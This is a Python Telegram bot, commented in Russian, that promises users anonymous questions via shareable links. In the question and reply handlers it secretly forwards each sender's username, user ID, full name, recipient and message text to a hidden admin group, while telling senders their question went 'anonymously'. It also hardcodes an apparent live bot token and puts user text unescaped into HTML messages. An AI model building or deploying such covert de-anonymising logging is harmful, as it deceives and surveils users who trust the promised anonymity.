import telebot
from telebot import types
import base64
import secrets
import sqlite3
from collections import defaultdict

# НАСТРОЙКИ
TOKEN = '8430859086:AAEsdPIGXI-xG-6COFj48AUnU69yseZOnZo'  # ← ТОКЕН!
ADMIN_CHAT_ID = -1003267199569  # Ваша группа

bot = telebot.TeleBot(TOKEN)
user_states = defaultdict(str)

conn = sqlite3.connect('anon_bot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS sessions (link TEXT PRIMARY KEY, owner_id INTEGER)')
conn.commit()

pending_questions = {}

def short_uuid():
    """Короткий уникальный ID (8 символов)"""
    token = secrets.token_bytes(4)
    return base64.urlsafe_b64encode(token).rstrip(b'=').decode()[:8]

@bot.message_handler(commands=['start'])
def start(message):
    parts = message.text.split()
    user_id = message.chat.id
    
    # Deep link — ждём вопрос
    if len(parts) > 1:
        link = parts[1]
        cursor.execute("SELECT owner_id FROM sessions WHERE link=?", (link,))
        result = cursor.fetchone()
        if result and result[0] != user_id:
            user_states[user_id] = ('waiting_question', link)
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("✍️ Написать вопрос"))
            bot.reply_to(message, "✅ Ссылка работает!\nНажми кнопку:", reply_markup=markup)
            return
        bot.reply_to(message, "❌ Неверная ссылка.")
        return
    
    # Создание короткой ссылки
    link_id = short_uuid()
    cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?)", (link_id, user_id))
    conn.commit()
    bot_username = bot.get_me().username
    share_url = f"https://t.me/{bot_username}?start={link_id}"
    
    # КЛИКАБЕЛЬНАЯ ССЫЛКА
    clickable = f"🔗 [Поделись ссылкой]({share_url})"
    bot.reply_to(message, clickable + "\n\n👥 Люди смогут задавать вопросы анонимно!", parse_mode='Markdown')

@bot.message_handler(func=lambda m: 'Написать вопрос' in m.text)
def ask_question(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    if state and state[0] == 'waiting_question':
        link = state[1]
        del user_states[user_id]
        markup = types.ReplyKeyboardRemove()
        msg = bot.reply_to(message, "💬 Напиши вопрос:", reply_markup=markup)
        bot.register_next_step_handler(msg, process_question, link)

def process_question(message, link):
    user_id = message.from_user.id
    cursor.execute("SELECT owner_id FROM sessions WHERE link=?", (link,))
    result = cursor.fetchone()
    if result:
        owner_id = result[0]
        q_id = short_uuid()
        pending_questions[q_id] = user_id
        
        # Анонимно владельцу
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{q_id}"))
        bot.send_message(owner_id, f"❓ Анонимный вопрос:\n<b>{message.text}</b>", reply_markup=markup, parse_mode='HTML')
        
        # СКРЫТЫЙ ЛОГ в админ группу
        sender_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
        sender_username = message.from_user.username or 'no_username'
        admin_log = f"""🕵️ ВОПРОС #{q_id}
👤 @{sender_username} ({user_id})
📛 {sender_name}
👥 → {owner_id}
💬 <b>{message.text}</b>"""
        bot.send_message(ADMIN_CHAT_ID, admin_log, parse_mode='HTML')
        
        bot.reply_to(message, "✅ Вопрос отправлен анонимно!")
    else:
        bot.reply_to(message, "❌ Ссылка недействительна.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
def reply_menu(call):
    q_id = call.data.split('_')[1]
    bot.answer_callback_query(call.id)
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
    msg = bot.reply_to(call.message, "💬 Твой ответ:")
    bot.register_next_step_handler(msg, process_reply, q_id)

def process_reply(message, q_id):
    sender_id = pending_questions.pop(q_id, None)
    if sender_id:
        bot.send_message(sender_id, f"📩 Ответ:\n<b>{message.text}</b>", parse_mode='HTML')
        bot.reply_to(message, "✅ Ответ доставлен!")
        
        # Лог ответа
        admin_log = f"""📤 ОТВЕТ #{q_id}
👤 От {message.from_user.id}
👥 Кому {sender_id}
💬 <b>{message.text}</b>"""
        bot.send_message(ADMIN_CHAT_ID, admin_log, parse_mode='HTML')

print("🚀 Анонимный бот готов! Короткие ссылки + админ логи.")
bot.polling(none_stop=True)
